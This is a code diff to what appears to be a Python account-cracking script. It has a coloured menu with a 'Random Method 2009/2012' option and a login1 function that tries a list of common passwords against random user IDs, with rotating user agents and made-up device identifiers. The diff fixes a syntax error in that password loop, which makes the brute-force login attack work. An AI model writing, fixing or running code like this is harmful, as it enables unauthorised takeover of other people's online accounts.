@@ -681,14 +681,12 @@ def main():
     print(f'\33[38;5;46m[\033[1;97m1\33[38;5;46m] \033[1;97mRandom Method \33[38;5;46m[\33[38;5;37m2009/2012\33[38;5;46m]\033[1;97m')
     linex()
     
-    ch = input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
+    ch = input(f'\33[38;5;46m[\033[1;97m1✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
 
     if ch in ('1','01','11','A','১','০১','a','A'):
         __Random_Method__()
-    else:
-        print("\033[1;91mInvalid Selection! Try Again.\033[0m")
+    
       
-
 def __Random_Method__():
     user = []
     clear()
@@ -735,7 +733,7 @@ def login1(uid):
         ua = random.choice(ugen)
 		
         # Original password list
-        for pw in ["123456","1234567","12345678","123456789","1234567890","786786","123123"]        
+        for pw in ["123456","1234567","12345678","123456789","1234567890","786786","123123"]:        
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
